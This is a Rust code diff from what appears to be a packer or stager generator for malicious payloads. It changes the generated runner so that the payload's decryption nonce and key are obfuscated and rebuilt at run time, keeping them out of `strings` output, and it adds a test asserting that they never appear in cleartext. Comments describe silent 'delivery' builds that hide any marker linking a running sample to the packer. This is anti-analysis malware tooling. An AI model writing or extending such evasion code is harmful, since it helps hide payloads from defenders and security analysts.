@@ -610,6 +610,11 @@ fn render_runner_body(
 
 /// The runner block that decrypts and runs an Execution step's payload.
 ///
+/// The nonce and key are hex-encoded at build time but never emitted as
+/// cleartext literals: they go through `strings` like the step args, so the
+/// stage does not carry a 24-byte nonce and its 32-byte key side by side for
+/// `strings <stage>` to pick up.
+///
 /// `debug` is the *only* thing that decides whether the per-build `stub_marker`
 /// is emitted. A delivery build (`debug == false`) must stay silent: the marker
 /// is a runtime token that links a running sample to the packer, so both the
@@ -671,7 +676,9 @@ fn render_execution_block(
              \x20           Ok(bytes) => bytes,\n\
              \x20           Err(_) => {{\n\
              \x20               let enc: &[u8] = include_bytes!(\"{path}\");\n\
-             \x20               decrypt_step(enc, \"{nonce}\", \"{key}\", {len})?\n\
+             \x20               let payload_nonce: String = {nonce};\n\
+             \x20               let payload_key: String = {key};\n\
+             \x20               decrypt_step(enc, &payload_nonce, &payload_key, {len})?\n\
              \x20           }}\n\
              \x20       }};\n\
              {marker_line}\
@@ -685,8 +692,8 @@ fn render_execution_block(
             args = args,
             overridden = overridden,
             path = payload.path,
-            nonce = hex::encode(payload.nonce),
-            key = hex::encode(payload.key),
+            nonce = secret_expr(&payload.nonce, "payload_nonce", strings),
+            key = secret_expr(&payload.key, "payload_key", strings),
             len = payload.plaintext_len,
             marker_line = marker_line,
             index = index,
@@ -695,7 +702,9 @@ fn render_execution_block(
             "    {{\n\
              \x20       crate::set_stage_args({args}, {overridden});\n\
              \x20       let enc: &[u8] = include_bytes!(\"{path}\");\n\
-             \x20       let mut image = decrypt_step(enc, \"{nonce}\", \"{key}\", {len})?;\n\
+             \x20       let payload_nonce: String = {nonce};\n\
+             \x20       let payload_key: String = {key};\n\
+             \x20       let mut image = decrypt_step(enc, &payload_nonce, &payload_key, {len})?;\n\
              {marker_line}\
              \x20       match step_{index}::payload(&mut image) {{\n\
              \x20           Ok(code) => {{\n\
@@ -707,13 +716,26 @@ fn render_execution_block(
             args = args,
             overridden = overridden,
             path = payload.path,
-            nonce = hex::encode(payload.nonce),
-            key = hex::encode(payload.key),
+            nonce = secret_expr(&payload.nonce, "payload_nonce", strings),
+            key = secret_expr(&payload.key, "payload_key", strings),
             len = payload.plaintext_len,
             marker_line = marker_line,
             index = index,
         ),
     }
+}
+
+/// The runtime reconstruction expression for a hex-encoded payload secret.
+///
+/// The nonce and the key follow `build.stub.strings` like every other stub
+/// literal, so neither lands in the stage as a cleartext hex string. There is
+/// no plaintext strategy (`from_yaml` accepts only `xor` and `stack`), so the
+/// emitted expression always rebuilds the string at run time; `stack` also
+/// keeps the bytes out of `.rdata`.
+fn secret_expr(secret: &[u8], var_name: &str, strings: &StringsConfig) -> String {
+    strings
+        .obfuscate(&hex::encode(secret))
+        .render_stub_expr(var_name)
 }
 
 /// One inline sleep.
@@ -810,6 +832,7 @@ pub(crate) fn test_params(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::engine::obfuscation::StringStrategy;
     #[cfg(feature = "live-tests")]
     use crate::plan::schema::Arch;
     use crate::plan::schema::{StepFailure, StepOutcome};
@@ -1128,9 +1151,78 @@ mod tests {
             "the embedded fallback is missing"
         );
         assert!(
-            out.contains("decrypt_step(enc"),
-            "the fallback is not decrypted"
+            out.contains("decrypt_step(enc, &payload_nonce, &payload_key"),
+            "the fallback is not decrypted through the rebuilt secrets"
         );
+    }
+
+    /// The runner must not hand the stage a cleartext nonce and key next to the
+    /// ciphertext: both are rebuilt at run time under the configured strategy.
+    #[test]
+    fn the_payload_nonce_and_key_are_never_cleartext_in_the_runner() {
+        let nonce_hex = hex::encode([0xAB; 24]);
+        let key_hex = hex::encode([0xCD; 32]);
+        let configs = [
+            strings(),
+            StringsConfig {
+                strategy: StringStrategy::Stack,
+                key: None,
+            },
+        ];
+
+        for source in [PayloadSource::Embedded, PayloadSource::StagedWithFallback] {
+            let mut step = execution_step(0);
+            let payload = step.payload.as_mut().expect("execution payload");
+            payload.nonce = [0xAB; 24];
+            payload.key = [0xCD; 32];
+            payload.source = source;
+            let params = StepsParams {
+                steps: vec![step],
+                build_args: BTreeMap::new(),
+                debug: false,
+                windows_subsystem: false,
+                kind: OutputKind::Exe,
+                entry: DllEntry::Auto,
+                console: ConsoleMode::Parent,
+                poly_seed: None,
+            };
+
+            for config in &configs {
+                let out = render_builtin(
+                    &template(),
+                    &params,
+                    config,
+                    &SyscallsConfig::default(),
+                    &ApiResolutionConfig::default(),
+                )
+                .expect("render");
+                assert!(
+                    !out.contains(&nonce_hex),
+                    "the nonce leaked in cleartext for {source:?} under {:?}: {out}",
+                    config.strategy
+                );
+                assert!(
+                    !out.contains(&key_hex),
+                    "the key leaked in cleartext for {source:?} under {:?}: {out}",
+                    config.strategy
+                );
+                assert!(
+                    out.contains("let payload_nonce: String = "),
+                    "the nonce is not rebuilt at run time for {source:?} under {:?}: {out}",
+                    config.strategy
+                );
+                assert!(
+                    out.contains("let payload_key: String = "),
+                    "the key is not rebuilt at run time for {source:?} under {:?}: {out}",
+                    config.strategy
+                );
+                assert!(
+                    out.contains("decrypt_step(enc, &payload_nonce, &payload_key, 16)"),
+                    "the runner does not pass the rebuilt secrets for {source:?} under {:?}: {out}",
+                    config.strategy
+                );
+            }
+        }
     }
 
     #[test]
